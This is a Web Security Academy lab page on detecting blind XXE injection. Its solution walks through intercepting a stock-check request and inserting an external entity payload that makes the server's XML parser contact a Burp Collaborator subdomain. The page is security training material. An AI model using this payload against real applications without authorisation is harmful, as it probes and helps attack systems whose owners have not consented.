# Lab: Blind XXE with out-of-band interaction

Source: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
Fetched: 2026-06-28T09:18:06.804481+00:00

Web Security Academy

XXE injection

Blind

Lab

Lab: Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Solution

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>

Replace the productId number with a reference to the external entity:

&xxe;

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

Community solutions

Garr_7

Michael Sommer (no audio)

Find XSS vulnerabilities using Burp Suite

Try for free
